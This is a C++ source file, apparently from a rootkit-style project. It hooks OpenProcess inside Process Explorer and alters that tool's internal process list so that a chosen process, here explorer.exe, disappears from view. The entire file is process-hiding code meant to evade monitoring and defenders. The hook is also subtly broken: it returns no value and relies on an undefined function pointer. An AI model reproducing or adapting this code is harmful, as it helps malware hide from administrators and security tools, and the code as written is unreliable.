#include "stdafx.h"
#include "Procexp.h"

Procexp::Procexp()
{
	
}

void Procexp::DoActions()
{
	RegisterHook(HideProcessHook, L"kernel32.dll", "OpenProcess");
}

HANDLE HideProcessHook(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId, process_explorer_proc_obj* procObj)
{
	MEMORY_BASIC_INFORMATION mbi;
	DWORD procId = dwProcessId;
	if (VirtualQuery(_ReturnAddress(), &mbi, sizeof(mbi)))
	{
		//Only hook if call originated from procexp
		if (GetModuleHandle(L"procexp64 - copy.exe") == (HMODULE)mbi.AllocationBase)
		{
			
			HANDLE procHandle = NULL;

			//filter target process
			if (procObj != NULL &&
				(procObj->proc_id % 4 == 0 && (int)procObj->proc_id < 0xffff) &&
				(procObj->flink_offset < 0xffff && procObj->flink_offset > 0xff) &&
				(DWORD64)procObj->proc_name > 0xffffffff)
			{
				process_explorer_proc_obj* next = (process_explorer_proc_obj*)((DWORD64)procObj + procObj->flink_offset);
				std::wstring targetProcName = (wchar_t*)(next->proc_name);
				if (targetProcName == L"explorer.exe")
				{
					procObj->flink_offset += (DWORD)next->flink_offset;

					procId = procObj->proc_id;
				  //setProcObj(procObj);
				}
			}
		}
	}

    ((OpenProcessFunc)targetProcAddr)(dwDesiredAccess, bInheritHandle, procId);
}

Procexp::~Procexp()
{
}
